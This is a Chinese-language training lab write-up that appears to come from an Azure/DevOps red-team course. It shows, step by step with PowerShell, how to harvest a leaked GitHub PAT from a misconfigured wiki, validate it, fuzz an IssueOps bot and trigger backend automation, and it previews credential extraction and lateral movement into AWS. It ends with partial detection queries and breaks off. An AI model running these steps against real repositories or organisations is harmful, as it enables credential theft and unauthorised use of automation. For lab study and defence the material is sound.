# Learning Objective 10：GitHub PAT 泄露与 CI/CD 自动化滥用

> **文档版本**: v2.0 (基于项目资料优化版)
> **学习目标**: 掌握 DevOps 供应链攻击技术，利用泄露的 GitHub PAT 和 IssueOps 滥用实现自动化流程劫持
> **难度**: 中级
> **预计时间**: 1-2 小时
> **Kill Chain**: KC3 Start (DevOps 供应链攻击)

---

## 目录

1. [核心目标概述](#核心目标概述)
2. [理论基础](#理论基础)
3. [实验条件与环境准备](#实验条件与环境准备)
4. [详细实验步骤](#详细实验步骤)
5. [检测与防御](#检测与防御)
6. [参考资料与文件位置](#参考资料与文件位置)

---

## 核心目标概述

本实验标志着 **Kill Chain 3 (KC3)** 的开始，切入点从 Azure AD 身份攻击转向 **DevOps 供应链攻击**。攻击场景涉及源代码管理平台（GitHub）的凭据泄露和 CI/CD 自动化流程的滥用。

### 攻击链示意图

```
┌─────────────────────────────────────────────────────────────────┐
│                      DevOps 供应链攻击链                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. 侦察阶段                                                    │
│     发现未授权访问的内部 Wiki 网站                               │
│     (https://refiningwiki.z13.web.core.windows.net/)             │
│     │                                                           │
│     ▼                                                           │
│  2. 凭据收集                                                    │
│     在 Wiki 中发现泄露的 GitHub Personal Access Token (PAT)      │
│     目标仓库: OilCorp/awsautomation                              │
│     │                                                           │
│     ▼                                                           │
│  3. 探测阶段                                                    │
│     使用 PAT 创建测试 Issue                                      │
│     分析错误反馈，发现触发关键字                                 │
│     │                                                           │
│     ▼                                                           │
│  4. 命令注入                                                    │
│     构造带有恶意的 Issue (createawsvmuser)                       │
│     触发后端自动化流程                                           │
│     │                                                           │
│     ▼                                                           │
│  5. 结果获取                                                    │
│     从机器人回复中获取 Job ID                                    │
│     为后续凭据提取做准备 (Objective 11)                          │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 关键里程碑

| 阶段 | 目标 | 技术要点 |
|------|------|----------|
| 侦察阶段 | 发现未保护的 Wiki 网站 | 信息泄露、配置错误 |
| 凭据获取 | 提取硬编码的 GitHub PAT | 硬编码凭据泄露 |
| 逻辑探测 | 通过错误消息推断触发命令 | 模糊测试、信息泄露 |
| 自动化滥用 | 利用 IssueOps 触发后端流程 | ChatOps/IssueOps |
| 证据收集 | 获取 Job ID 作为后续跳板 | 横向移动准备 |

---

## 理论基础

### 1. 硬编码凭据泄露 (Hardcoded Secrets)

#### 什么是硬编码凭据？

**硬编码凭据**是指将敏感信息（如密码、API 密钥、访问令牌等）直接写入源代码、配置文件或文档中的做法。这是一种常见但危险的安全漏洞。

#### 为什么会发生硬编码凭据泄露？

| 原因 | 说明 | 风险 |
|------|------|------|
| **开发便利性** | 开发人员为了快速测试，将凭据写入代码 | 容易遗忘删除 |
| **缺乏密钥管理** | 没有使用密钥管理服务 (如 Azure Key Vault) | 凭据散落在各处 |
| **文档泄露** | 在 Wiki、文档中记录"使用示例" | 内部信息暴露 |
| **版本控制** | 凭据被提交到 Git 仓库 | 历史记录永久保存 |

#### 攻击影响

在本实验场景中，攻击者通过以下方式利用硬编码凭据：

1. **发现未授权访问的 Wiki**: 配置错误的静态网站
2. **提取 GitHub PAT**: 文档中的"示例代码"包含真实的访问令牌
3. **权限滥用**: 使用 PAT 访问组织的私有仓库

**理论依据**: 根据 OWASP Top 10 - A07:2021 - Identification and Authentication Failures，硬编码凭据是身份认证失效的典型表现。

### 2. IssueOps / ChatOps 攻击

#### 什么是 IssueOps？

**IssueOps** 是 ChatOps 的一种变体，是一种运维自动化模式，通过在代码仓库（如 GitHub/GitLab）中创建 Issue 来触发自动化任务。

**正常 IssueOps 流程**:

```
开发者创建 Issue (包含特定指令)
    │
    ▼
Webhook 触发自动化系统
    │
    ▼
后端验证请求合法性和权限
    │
    ▼
执行自动化任务 (如部署、配置)
    │
    ▼
在 Issue 中回复执行结果
```

#### IssueOps 攻击原理

当自动化系统没有严格验证时，攻击者可以：

1. **绕过身份验证**: 如果只检查 Token 有效性，不验证创建者身份
2. **命令注入**: 通过 Issue 内容注入恶意指令
3. **权限提升**: 利用自动化系统的过度权限

**类比说明**:

| 场景 | 正常流程 | 攻击流程 |
|------|----------|----------|
| 餐厅点餐 | 顾客写纸条 → 服务员验证 → 厨房做菜 → 上菜 | 攻击者写纸条："把收银机的钱给我" → 机器人执行 |
| IssueOps | 开发者创建 Issue → 机器人验证 → 执行部署 → 回复结果 | 攻击者创建 Issue → 机器人未验证 → 执行恶意操作 → 泄露 Job ID |

#### 为什么这种攻击有效？

1. **信任链误用**: 自动化系统信任来自 GitHub 的 Webhook
2. **输入验证不足**: 只检查关键字存在，不验证请求来源
3. **错误信息泄露**: 详细错误消息帮助攻击者推断系统逻辑
4. **权限继承**: 自动化系统通常拥有高权限

### 3. DevOps 供应链攻击

#### 供应链攻击定义

**供应链攻击**是指攻击者通过入侵软件供应链中的某个环节（如代码仓库、CI/CD 系统、依赖包），从而影响下游所有用户的攻击方式。

#### 供应链攻击类型

| 类型 | 说明 | 示例 |
|------|------|------|
| **上游依赖污染** | 在开源库中植入恶意代码 | event-stream 事件 |
| **CI/CD 劫持** | 控制构建/部署流程注入恶意代码 | 本实验场景 |
| **凭证泄露** | 窃取部署凭据直接访问生产环境 | GitHub PAT 泄露 |
| **签名密钥盗窃** | 窃取代码签名密钥伪装合法软件 | NVIDIA 黑客事件 |

#### 为什么供应链攻击危险？

1. **信任传递**: 用户信任上游软件供应商
2. **规模放大**: 一个漏洞影响所有下游用户
3. **检测困难**: 恶意代码隐藏在"正常"更新中
4. **持久化**: 可以长期潜伏在供应链中

### 4. GitHub Personal Access Token (PAT)

#### PAT 基础知识

GitHub Personal Access Token 是一种用于身份验证的凭据，可以代替密码进行 Git 操作和 API 调用。

**PAT 权限范围** (scopes):

| Scope | 权限 | 风险 |
|-------|------|------|
| `repo` | 完整仓库控制 (读写) | **高** - 可修改代码 |
| `repo:status` | 读写提交状态 | 中 - 可欺骗 CI |
| `public_repo` | 访问公共仓库 | 低 |
| `admin:org` | 组织管理 | **极高** - 完全控制 |

**Token 格式**:
```
github_pat_1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij
```

#### PAT 的安全风险

| 风险 | 说明 | 缓解措施 |
|------|------|----------|
| **权限过大** | PAT 通常授予过多权限 | 使用最小权限原则 |
| **无过期时间** | 永久 Token 风险高 | 设置短过期时间 |
| **难以撤销** | 无法追踪 Token 使用位置 | 记录 Token 用途 |
| **日志不详细** | GitHub API 日志有限 | 启用详细审计 |

### 5. MITRE ATT&CK 框架映射

基于项目中的 [ServicePrincipals-ADO.md](ServicePrincipals-ADO.md) 和相关文档，本实验涉及的 TTPs：

| 战术 | 技术 | 描述 |
|------|------|------|
| **Initial Access** | [T1190.001](https://attack.mitre.org/techniques/T1190/001/) - Exploit Public-Facing Application | 利用配置错误的公开 Wiki |
| **Credential Access** | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) - Credentials In Files | 从 Wiki 文档中提取硬编码凭据 |
| **Execution** | [T1059.001](https://attack.mitre.org/techniques/T1059/001/) - Command and Scripting Interpreter: PowerShell | 通过 Issue 触发 PowerShell 自动化 |
| **Defense Evasion** | [T1078.004](https://attack.mitre.org/techniques/T1078/004/) - Valid Accounts: Cloud Accounts | 滥用合法的 GitHub PAT |

---

## 实验条件与环境准备

### 前置条件

#### 1. 实验环境访问

在开始本实验之前，需要满足以下条件：

| 项目 | 要求 | 验证方法 |
|------|------|----------|
| 网络访问 | 可访问目标 Wiki 网站 | `curl https://refiningwiki.z13.web.core.windows.net/` |
| 工具 | PowerShell 5.1+ 或 PowerShell 7+ | `$PSVersionTable.PSVersion` |
| API 访问 | GitHub API 可访问 | `Invoke-RestMethod https://api.github.com` |

#### 2. 理解基础概念

| 概念 | 说明 | 参考资料 |
|------|------|----------|
| GitHub API | RESTful API，用于管理 GitHub 资源 | [GitHub REST API docs](https://docs.github.com/en/rest) |
| OAuth Token | 用于身份验证的访问令牌 | [OAuth 2.0 RFC 6749](https://tools.ietf.org/html/rfc6749) |
| JSON 格式 | API 请求和响应的数据格式 | [JSON RFC 8259](https://tools.ietf.org/html/rfc8259) |

### 为什么需要这些条件？

#### 条件 1: 为什么需要网络访问？

Wiki 网站是攻击的**入口点**：
- 托管在 Azure Storage Static Website
- 配置错误导致未授权访问
- 包含敏感的自动化脚本和凭据

**技术背景**: Azure Static Website 默认不启用访问控制，需要显式配置 Azure AD 集成或使用专用网络。

#### 条件 2: 为什么使用 PowerShell？

PowerShell 是 Windows 环境的**原生管理工具**：
- 强大的 HTTP 请求处理 (`Invoke-RestMethod`)
- JSON 序列化/反序列化支持 (`ConvertTo-Json`, `ConvertFrom-Json`)
- 与 Azure 生态系统深度集成

#### 条件 3: 为什么需要理解 GitHub API？

GitHub API 是执行攻击的**主要接口**：
- 创建 Issue: `POST /repos/{owner}/{repo}/issues`
- 获取评论: `GET /repos/{owner}/{repo}/issues/{issue_number}/comments`
- 需要 PAT 进行身份验证

### 环境验证检查清单

```powershell
# 运行此脚本来验证实验环境
Write-Host "检查 DevOps 供应链攻击实验环境..." -ForegroundColor Cyan

# 1. 检查网络访问
try {
    $response = Invoke-WebRequest -Uri "https://refiningwiki.z13.web.core.windows.net/" -UseBasicParsing -TimeoutSec 10
    if ($response.StatusCode -eq 200) {
        Write-Host "[✓] Wiki 网站可访问" -ForegroundColor Green
    }
} catch {
    Write-Host "[✗] 无法访问 Wiki 网站" -ForegroundColor Red
    Write-Host "    检查网络连接和 URL 正确性" -ForegroundColor Yellow
}

# 2. 检查 PowerShell 版本
$psVersion = $PSVersionTable.PSVersion
Write-Host "[*] PowerShell 版本: $($psVersion.Major).$($psVersion.Minor)" -ForegroundColor Cyan
if ($psVersion.Major -ge 5) {
    Write-Host "[✓] PowerShell 版本满足要求" -ForegroundColor Green
} else {
    Write-Host "[!] 建议升级 PowerShell" -ForegroundColor Yellow
}

# 3. 检查 GitHub API 访问
try {
    $apiTest = Invoke-RestMethod -Uri "https://api.github.com/zen" -TimeoutSec 10
    Write-Host "[✓] GitHub API 可访问" -ForegroundColor Green
} catch {
    Write-Host "[✗] 无法访问 GitHub API" -ForegroundColor Red
}

# 4. 检查 JSON 处理能力
try {
    $testJson = @{test="value"} | ConvertTo-Json | ConvertFrom-Json
    Write-Host "[✓] JSON 处理正常" -ForegroundColor Green
} catch {
    Write-Host "[✗] JSON 处理失败" -ForegroundColor Red
}

Write-Host "`n环境检查完成!" -ForegroundColor Green
```

### 实验变量设置

```powershell
# 实验环境变量（根据实际情况修改）
$wikiUrl = "https://refiningwiki.z13.web.core.windows.net/"
$githubApiBase = "https://api.github.com"
$targetRepo = "OilCorp/awsautomation"

# 这些将在实验中获取
$pat = ""  # 从 Wiki 中获取
$issueId = 0  # 创建 Issue 后记录
```

---

## 详细实验步骤

### 步骤 1：侦察与信息收集 (Reconnaissance)

#### 目标

发现并访问配置错误的内部 Wiki 网站，提取泄露的 GitHub PAT 和自动化脚本信息。

#### 技术原理

**侦察方法**:
- 子域名枚举
- 存储账户命名惯例猜测
- 网络扫描

**信息泄露类型**:
- 硬编码凭据
- 内部网络拓扑
- 自动化流程逻辑

#### 详细操作

```powershell
# 1. 访问 Wiki 网站
$wikiUrl = "https://refiningwiki.z13.web.core.windows.net/"
Write-Host "正在访问 Wiki: $wikiUrl" -ForegroundColor Cyan

# 方法 1: 使用浏览器（推荐用于初步探索）
Start-Process $wikiUrl

# 方法 2: 使用 PowerShell 下载内容
$response = Invoke-WebRequest -Uri $wikiUrl -UseBasicParsing
$htmlContent = $response.Content

# 2. 分析 HTML 内容，查找凭据模式
Write-Host "`n搜索潜在的 GitHub PAT..." -ForegroundColor Cyan

# GitHub PAT 模式: github_pat_ 开头，约 80 字符
$patPattern = "github_pat_[A-Za-z0-9_]{72,}"
$matches = [regex]::Matches($htmlContent, $patPattern)

if ($matches.Count -gt 0) {
    Write-Host "[!] 发现潜在的 GitHub PAT:" -ForegroundColor Yellow
    $pat = $matches[0].Value
    Write-Host "    $pat" -ForegroundColor Red

    # 保存到变量供后续使用
    $global:githubPat = $pat
} else {
    Write-Host "[✗] 未在 HTML 中发现 PAT" -ForegroundColor Red
    Write-Host "    可能需要手动检查页面源代码" -ForegroundColor Yellow
}

# 3. 查找 GitHub 仓库引用
$repoPattern = "repos/([\w-]+)/([\w-]+)"
$repoMatches = [regex]::Matches($htmlContent, $repoPattern)

if ($repoMatches.Count -gt 0) {
    Write-Host "`n[*] 发现 GitHub 仓库引用:" -ForegroundColor Cyan
    foreach ($match in $repoMatches) {
        $owner = $match.Groups[1].Value
        $repo = $match.Groups[2].Value
        Write-Host "    - $owner/$repo" -ForegroundColor Green
    }
}

# 4. 查找自动化脚本或命令
Write-Host "`n[*] 搜索自动化脚本片段..." -ForegroundColor Cyan

# 常见的 PowerShell 命令模式
$scriptPatterns = @(
    "Invoke-RestMethod",
    "Invoke-WebRequest",
    "New-AzAutomation",
    "Start-AzAutomationRunbook",
    "createawsvmuser"  # 实验特定的关键字
)

foreach ($pattern in $scriptPatterns) {
    if ($htmlContent -like "*$pattern*") {
        Write-Host "    [+] 发现关键字: $pattern" -ForegroundColor Yellow
    }
}
```

#### 预期发现

访问 Wiki 后，应该会发现以下内容：

```
=== Integration with DevOps ===

To automate the creation of AWS VM users, use the following PowerShell script:

```powershell
$accessToken = "github_pat_11AK...[完整 Token]"
$repo = "OilCorp/awsautomation"
$url = "https://api.github.com/repos/$repo/issues"

$body = @{
    title = "New User Request"
    body = "createawsvmuser"  # Important: This keyword is required!
} | ConvertTo-Json

Invoke-RestMethod -Uri $url -Method POST -Headers @{
    Authorization = "Bearer $accessToken"
} -Body $body
```
```

**关键信息提取**:

| 信息 | 值 | 用途 |
|------|-----|------|
| GitHub PAT | `github_pat_...` | 身份验证 |
| 目标仓库 | `OilCorp/awsautomation` | Issue 创建目标 |
| 触发关键字 | `createawsvmuser` | 自动化触发条件 |
| API 端点 | `https://api.github.com/...` | 请求地址 |

#### 为什么这个步骤重要？

1. **建立攻击向量**: Wiki 是唯一的初始访问点
2. **信息收集**: 获取执行攻击所需的所有信息
3. **理解目标逻辑**: 了解自动化系统如何工作

**设计依据**: 根据 MITRE ATT&CK，侦察 (Reconnaissance) 是所有攻击的第一阶段，目标越明确，后续攻击成功率越高。

---

### 步骤 2：验证 PAT 有效性 (Validation)

#### 目标

测试从 Wiki 中提取的 GitHub PAT 是否有效，并了解其权限范围。

#### 技术原理

**GitHub API 身份验证**:

```
Authorization: Bearer <PAT>
```

**Token 验证端点**:
- GET `/user` - 获取当前用户信息
- GET `/user/repos` - 获取可访问的仓库
- HEAD `/repos/{owner}/{repo}` - 检查仓库访问权限

#### 详细操作

```powershell
# 从步骤 1 获取的 PAT
$pat = $global:githubPat

if ([string]::IsNullOrEmpty($pat)) {
    Write-Host "[✗] 请先运行步骤 1 获取 PAT" -ForegroundColor Red
    exit 1
}

# 1. 验证 Token 有效性
Write-Host "验证 GitHub PAT..." -ForegroundColor Cyan

$headers = @{
    "Authorization" = "Bearer $pat"
    "Accept" = "application/vnd.github+json"
    "X-GitHub-Api-Version" = "2022-11-28"
}

try {
    # 获取 Token 关联的用户信息
    $userResponse = Invoke-RestMethod -Uri "https://api.github.com/user" -Headers $headers

    Write-Host "[✓] Token 有效!" -ForegroundColor Green
    Write-Host "    用户: $($userResponse.login)" -ForegroundColor Cyan
    Write-Host "    类型: $($userResponse.type)" -ForegroundColor Cyan
    Write-Host "    账户创建时间: $($userResponse.created_at)" -ForegroundColor Cyan

} catch {
    Write-Host "[✗] Token 无效或已过期" -ForegroundColor Red
    Write-Host "    错误: $($_.Exception.Message)" -ForegroundColor Yellow
    exit 1
}

# 2. 检查对目标仓库的访问权限
Write-Host "`n检查目标仓库访问权限..." -ForegroundColor Cyan

$targetOwner = "OilCorp"
$targetRepo = "awsautomation"
$repoUrl = "https://api.github.com/repos/$targetOwner/$targetRepo"

try {
    $repoInfo = Invoke-RestMethod -Uri $repoUrl -Headers $headers

    Write-Host "[✓] 可访问目标仓库" -ForegroundColor Green
    Write-Host "    仓库: $($repoInfo.full_name)" -ForegroundColor Cyan
    Write-Host "    描述: $($repoInfo.description)" -ForegroundColor Cyan
    Write-Host "    私有: $($repoInfo.private)" -ForegroundColor Cyan
    Write-Host "    权限:" -ForegroundColor Cyan
    Write-Host "      - Admin: $($repoInfo.permissions.admin)" -ForegroundColor Cyan
    Write-Host "      - Push: $($repoInfo.permissions.push)" -ForegroundColor Cyan
    Write-Host "      - Pull: $($repoInfo.permissions.pull)" -ForegroundColor Cyan

    # 保存到全局变量
    $global:repoUrl = $repoUrl

} catch {
    Write-Host "[✗] 无法访问目标仓库" -ForegroundColor Red
    Write-Host "    错误: $($_.Exception.Message)" -ForegroundColor Yellow
    exit 1
}

# 3. 检查 PAT 权限范围（如果可见）
Write-Host "`nPAT 权限分析..." -ForegroundColor Cyan

# 尝试列出仓库的 Issues（测试 repo 权限）
$issuesUrl = "$repoUrl/issues"
try {
    $issues = Invoke-RestMethod -Uri $issuesUrl -Headers $headers
    Write-Host "[✓] 有 Issues 读取权限" -ForegroundColor Green
    Write-Host "    当前开放 Issue 数: $($issues.Count)" -ForegroundColor Cyan
} catch {
    Write-Host "[!] Issues 访问受限" -ForegroundColor Yellow
}
```

#### 预期结果

```
验证 GitHub PAT...
[✓] Token 有效!
    用户: OilCorp-Bot
    类型: Bot
    账户创建时间: 2024-01-15T10:30:00Z

检查目标仓库访问权限...
[✓] 可访问目标仓库
    仓库: OilCorp/awsautomation
    描述: AWS automation scripts and infrastructure
    私有: True
    权限:
      - Admin: False
      - Push: True
      - Pull: True

PAT 权限分析...
[✓] 有 Issues 读取权限
    当前开放 Issue 数: 38
```

#### 权限分析

| 权限 | 状态 | 攻击影响 |
|------|------|----------|
| Push | True | 可以创建 Issue |
| Pull | True | 可以读取仓库内容 |
| Admin | False | 不能修改仓库设置 |

**结论**: Token 具有创建 Issue 所需的最低权限。

#### 为什么需要验证 Token？

1. **确保攻击可行性**: 无效 Token 会导致所有后续步骤失败
2. **了解权限边界**: 知道能做什么、不能做什么
3. **避免检测**: 避免使用无效 Token 触发告警

---

### 步骤 3：初次探测与逻辑推断 (Fuzzing)

#### 目标

创建一个测试 Issue，通过分析自动化的错误响应来推断触发自动化所需的关键字和参数。

#### 技术原理

**模糊测试 (Fuzzing)**:
- 向系统发送各种输入
- 分析输出差异
- 推断系统逻辑

**错误信息泄露**:
- 详细的错误消息可能泄露：
  - 系统架构信息
  - 必需参数
  - 验证逻辑
  - 后端技术栈

#### 详细操作

```powershell
# 准备创建测试 Issue
Write-Host "创建测试 Issue 进行探测..." -ForegroundColor Cyan

# 构造 Issue 请求
$issueUrl = "$global:repoUrl/issues"

# 尝试 1: 不包含任何关键字
$testBody1 = @{
    title = "Test Issue $(Get-Date -Format 'yyyyMMddHHmmss')"
    body = "This is a test issue created by automation."
} | ConvertTo-Json

Write-Host "`n[尝试 1] 创建普通 Issue..." -ForegroundColor Yellow
Write-Host "Body: $($testBody1)" -ForegroundColor Gray

try {
    $response1 = Invoke-RestMethod -Uri $issueUrl -Method POST -Headers $headers -Body $testBody1 -ContentType "application/json"
    $issueNumber1 = $response1.number
    $global:testIssue1 = $issueNumber1

    Write-Host "[✓] Issue 创建成功: #$issueNumber1" -ForegroundColor Green
    Write-Host "    HTML URL: $($response1.html_url)" -ForegroundColor Cyan
    Write-Host "    等待自动化响应..." -ForegroundColor Cyan

    # 等待自动化处理
    Start-Sleep -Seconds 5

    # 检查评论
    $commentsUrl = "$issueUrl/$issueNumber1/comments"
    $comments = Invoke-RestMethod -Uri $commentsUrl -Headers $headers

    if ($comments.Count -gt 0) {
        Write-Host "`n[*] 收到自动化响应:" -ForegroundColor Cyan
        foreach ($comment in $comments) {
            Write-Host "    用户: $($comment.user.login)" -ForegroundColor Gray
            Write-Host "    内容: $($comment.body)" -ForegroundColor Yellow
            Write-Host "    时间: $($comment.created_at)" -ForegroundColor Gray
            Write-Host ""
        }
    } else {
        Write-Host "[!] 暂无评论响应" -ForegroundColor Yellow
        Write-Host "    等待更长时间或检查 Issue 页面" -ForegroundColor Yellow
    }

} catch {
    Write-Host "[✗] Issue 创建失败" -ForegroundColor Red
    Write-Host "    错误: $($_.Exception.Message)" -ForegroundColor Yellow
}
```

#### 预期错误响应

```
[*] 收到自动化响应:
    用户: OilCorp-Bot
    内容: Error creating issue: Validation Failed

    Resource: Issue
    Field: body
    Code: missing_required_field
    Message: createawsvmuser is required

    时间: 2024-01-15T14:35:22Z
```

#### 错误分析

| 错误字段 | 值 | 含义 |
|----------|-----|------|
| Field | body | 问题出在 Issue 内容 |
| Code | missing_required_field | 缺少必需字段 |
| Message | createawsvmuser is required | 必须包含此关键字 |

**关键发现**:
1. 自动化系统检查 Issue 内容
2. 必须包含 `createawsvmuser` 关键字
3. 系统返回详细的验证错误（信息泄露）

#### 为什么使用模糊测试？

1. **黑盒测试**: 在不了解内部逻辑的情况下探索系统
2. **错误利用**: 利用详细错误消息推断系统行为
3. **最小检测**: 使用看似正常的请求避免触发告警

**设计依据**: 许多 DevOps 自动化系统为了便于调试，会返回详细的错误信息，这无意中帮助攻击者理解系统逻辑。

---

### 步骤 4：构造有效载荷并触发自动化 (Exploitation)

#### 目标

根据步骤 3 的发现，构造包含正确关键字的 Issue，触发后端自动化流程。

#### 技术原理

**命令注入原理**:
```
正常输入: "Please create a new VM user"
过滤检查: 包含 "createawsvmuser" ?
    ├─ Yes: 执行自动化脚本
    └─ No: 返回错误
```

**攻击载荷构造**:
- 包含必需的关键字
- 看起来像合法的请求
- 触发预期的自动化行为

#### 详细操作

```powershell
# 构造包含关键字的 Issue
Write-Host "构造恶意载荷并触发自动化..." -ForegroundColor Cyan

$exploitBody = @{
    title = "AWS VM User Request - Production"
    body = @"
We need to create a new AWS VM user for the production environment.

Please createawsvmuser with the following configuration:
- Environment: Production
- Region: us-east-1
- Instance Type: t3.medium
- Purpose: Web server deployment

Ticket: INC-$(Get-Random -Minimum 10000 -Maximum 99999)
"@
} | ConvertTo-Json

Write-Host "`n[恶意载荷]" -ForegroundColor Yellow
Write-Host $exploitBody -ForegroundColor Gray

try {
    # 创建 Issue
    $response2 = Invoke-RestMethod -Uri $issueUrl -Method POST -Headers $headers -Body $exploitBody -ContentType "application/json"

    $issueNumber2 = $response2.number
    $global:exploitIssue = $issueNumber2

    Write-Host "`n[✓] 恶意 Issue 创建成功: #$issueNumber2" -ForegroundColor Green
    Write-Host "    HTML URL: $($response2.html_url)" -ForegroundColor Cyan

    # 等待自动化处理
    Write-Host "`n[*] 等待自动化处理..." -ForegroundColor Cyan
    Write-Host "    等待 10 秒..." -ForegroundColor Gray
    Start-Sleep -Seconds 10

    # 检查自动化响应
    $commentsUrl2 = "$issueUrl/$issueNumber2/comments"
    $comments2 = Invoke-RestMethod -Uri $commentsUrl2 -Headers $headers

    Write-Host "`n[*] 自动化响应:" -ForegroundColor Cyan
    foreach ($comment in $comments2) {
        Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor DarkGray
        Write-Host "  用户: $($comment.user.login)" -ForegroundColor Gray
        Write-Host "  类型: $($comment.user.type)" -ForegroundColor Gray
        Write-Host "  时间: $($comment.created_at)" -ForegroundColor Gray
        Write-Host "`n  内容:" -ForegroundColor Gray
        Write-Host "  $($comment.body)" -ForegroundColor White
        Write-Host ""

        # 保存 Job ID（如果存在）
        if ($comment.body -match 'JobId[s]?:?\s*\[?([a-f0-9-]+)\]?') {
            $jobId = $matches[1]
            $global:jobId = $jobId
            Write-Host "  [!] 发现 Job ID: $jobId" -ForegroundColor Yellow
        }
    }

} catch {
    Write-Host "[✗] 恶意 Issue 创建失败" -ForegroundColor Red
    Write-Host "    错误: $($_.Exception.Message)" -ForegroundColor Yellow
}
```

#### 预期成功响应

```
[✓] 恶意 Issue 创建成功: #42

[*] 等待自动化处理...
    等待 10 秒...

[*] 自动化响应:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  用户: OilCorp-Bot
  类型: Bot
  时间: 2024-01-15T14:37:45Z

  内容:
  Automation started successfully.

  Job created: 742e4e1d-ece0-43d8-9544-0ccf0683a465
  Status: Queued
  Target: AWS Account 123456789012

  The VM user creation job has been queued.
  You can check the status using the Job ID above.

  [!] 发现 Job ID: 742e4e1d-ece0-43d8-9544-0ccf0683a465
```

#### 响应分析

| 字段 | 值 | 含义 |
|------|-----|------|
| Status | Queued | 任务已排队 |
| Job ID | UUID 格式 | 唯一任务标识符 |
| Target | AWS Account | 目标云账户 |

**成功指标**:
1. 没有返回错误
2. 收到 Job ID
3. 任务状态为 Queued 或 Running

#### 为什么这次成功了？

| 尝试 | Body 内容 | 结果 | 原因 |
|------|-----------|------|------|
| 步骤 3 | "This is a test" | 失败 | 缺少关键字 |
| 步骤 4 | 包含 "createawsvmuser" | 成功 | 通过验证 |

**关键差异**: 包含了 `createawsvmuser` 关键字，通过了自动化系统的验证检查。

---

### 步骤 5：结果提取与后续利用 (Post-Exploitation)

#### 目标

确认自动化执行结果，提取 Job ID，为下一步攻击（Objective 11）做准备。

#### 技术原理

**Job ID 的价值**:
- 唯一标识一个自动化任务
- 可用于查询任务状态
- 可能包含任务输出信息
- 是后续横向移动的关键

**后续利用路径**:
```
Job ID (Objective 10)
    │
    ▼
查询 Azure Automation Job 状态
    │
    ▼
提取 Job Output (可能包含凭据)
    │
    ▼
横向移动到 AWS 环境 (Objective 11)
```

#### 详细操作

```powershell
# 提取并保存攻击结果
Write-Host "提取攻击结果..." -ForegroundColor Cyan

if ($global:jobId) {
    Write-Host "[✓] 成功获取 Job ID" -ForegroundColor Green

    $result = [PSCustomObject]@{
        IssueNumber = $global:exploitIssue
        JobId = $global:jobId
        Timestamp = Get-Date -Format "o"
        IssueUrl = "https://github.com/$targetOwner/$targetRepo/issues/$($global:exploitIssue)"
    }

    # 保存到文件
    $resultFile = "C:\AzAD\Tools\Objective10_Result.json"
    $result | ConvertTo-Json | Out-File -FilePath $resultFile -Encoding UTF8

    Write-Host "`n[*] 攻击结果已保存到: $resultFile" -ForegroundColor Cyan
    Write-Host "    Job ID: $($result.JobId)" -ForegroundColor Yellow
    Write-Host "    Issue: #$($result.IssueNumber)" -ForegroundColor Yellow

    # 显示 JSON 内容
    Write-Host "`n[JSON 内容]" -ForegroundColor Gray
    Get-Content $resultFile | Write-Host -ForegroundColor Gray

} else {
    Write-Host "[!] 未发现 Job ID" -ForegroundColor Yellow
    Write-Host "    检查 Issue 评论以获取更多详细信息" -ForegroundColor Yellow

    # 再次尝试获取评论
    if ($global:exploitIssue) {
        Write-Host "`n重新获取 Issue #$global:exploitIssue 的评论..." -ForegroundColor Cyan
        $commentsUrl = "$global:repoUrl/issues/$global:exploitIssue/comments"
        $comments = Invoke-RestMethod -Uri $commentsUrl -Headers $headers

        foreach ($comment in $comments) {
            if ($comment.user.type -eq "Bot") {
                Write-Host "`nBot 响应:" -ForegroundColor Cyan
                Write-Host $comment.body -ForegroundColor White
            }
        }
    }
}

# 攻击链总结
Write-Host "`n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor Cyan
Write-Host "攻击链完成总结" -ForegroundColor Cyan
Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor Cyan
Write-Host "
1. [侦察] 发现未授权访问的 Wiki: $wikiUrl
2. [凭据] 提取 GitHub PAT: $($pat.Substring(0, 20))...
3. [探测] 通过错误分析发现触发关键字: createawsvmuser
4. [利用] 创建恶意 Issue 触发自动化: Issue #$($global:exploitIssue)
5. [结果] 获取 Job ID: $($global:jobId)
" -ForegroundColor White

Write-Host "
下一步 (Objective 11):
- 使用 Job ID 查询 Azure Automation Job 详情
- 提取 Job Output 中的凭据
- 横向移动到 AWS 环境
" -ForegroundColor Yellow
```

#### 预期最终结果

```
[✓] 成功获取 Job ID

[*] 攻击结果已保存到: C:\AzAD\Tools\Objective10_Result.json
    Job ID: 742e4e1d-ece0-43d8-9544-0ccf0683a465
    Issue: #42

[JSON 内容]
{
  "IssueNumber": 42,
  "JobId": "742e4e1d-ece0-43d8-9544-0ccf0683a465",
  "Timestamp": "2024-01-15T14:40:00.0000000+00:00",
  "IssueUrl": "https://github.com/OilCorp/awsautomation/issues/42"
}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
攻击链完成总结
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. [侦察] 发现未授权访问的 Wiki: https://refiningwiki.z13.web.core.windows.net/
2. [凭据] 提取 GitHub PAT: github_pat_11AKI...
3. [探测] 通过错误分析发现触发关键字: createawstmuser
4. [利用] 创建恶意 Issue 触发自动化: Issue #42
5. [结果] 获取 Job ID: 742e4e1d-ece0-43d8-9544-0ccf0683a465

下一步 (Objective 11):
- 使用 Job ID 查询 Azure Automation Job 详情
- 提取 Job Output 中的凭据
- 横向移动到 AWS 环境
```

---

## 检测与防御

### 检测方法

基于项目的 [IdentitySecurityMonitoring.md](IdentitySecurityMonitoring.md) 和相关检测规则：

#### 1. GitHub PAT 异常使用检测

**检测逻辑**: 监控 GitHub PAT 的异常使用模式

```kusto
// KQL 查询示例 - Microsoft Sentinel
// 需要集成 GitHub Audit Logs
GithubAudit
| where action == "issues.create"
| where user_type == "Bot"
| extend repo_name = tostring(repository.name)
| where repo_name =~ "awsautomation"
| project TimeGenerated, actor, repo_name, action, issue_number
| order by TimeGenerated desc
```

#### 2. Wiki 未授权访问检测

**检测逻辑**: 监控 Azure Storage 的异常访问

```kusto
